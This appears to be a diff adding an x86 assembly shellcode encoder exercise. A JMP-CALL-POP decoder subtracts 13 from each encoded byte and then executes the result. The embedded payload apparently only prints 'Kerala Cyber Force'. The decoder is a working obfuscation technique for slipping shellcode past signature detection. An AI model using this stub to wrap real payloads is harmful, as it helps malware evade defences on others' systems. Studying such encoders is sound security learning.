@@ -1,0 +1,34 @@
+
+section .text
+global _start:
+
+_start:
+call call_decoder
+decoder:
+pop esi ; shellcode address
+xor ecx, ecx ; zero out ecx
+mov cl, len ; initialize counter
+decode:
+cmp byte [esi], 0xD ; can we substract 13?
+jl wrap_around ; nope, we need to wrap around
+sub byte [esi], 0xD ; substract 13
+jmp short process_shellcode ; process the rest of the shellcode
+wrap_around:
+xor edx, edx ; zero out edx
+mov dl, 0xD ; edx = 13
+sub dl, byte [esi] ; 13 - shellcode byte value
+xor ebx,ebx ; zero out ebx
+mov bl, 0xff ; store 0x100 without introducing null bytes
+inc ebx
+sub bx, dx ; 256 - (13 - shellcode byte value)
+mov byte [esi], bl ; write decoded value
+process_shellcode:
+inc esi ; move to the next byte
+loop decode ; decode current byte
+call shellcode ; execute decoded shellcode
+
+call_decoder:
+call decoder
+shellcode: 
+db 0xf8,0x26,0x3e,0xcd,0x3e,0xe8,0x3e,0xdf,0x3e,0xd6,0xbd,0x11,0xc0,0x0e,0x66,0xbf,0x1f,0xda,0x8d,0x3e,0xcd,0xbd,0x0e,0x3e,0xe8,0xda,0x8d,0xf5,0xef,0x0c,0x0c,0x0c,0x58,0x72,0x7f,0x6e,0x79,0x6e,0x2d,0x50,0x86,0x6f,0x72,0x7f,0x2d,0x53,0x7c,0x7f,0x70,0x72
+len: equ $-shellcode
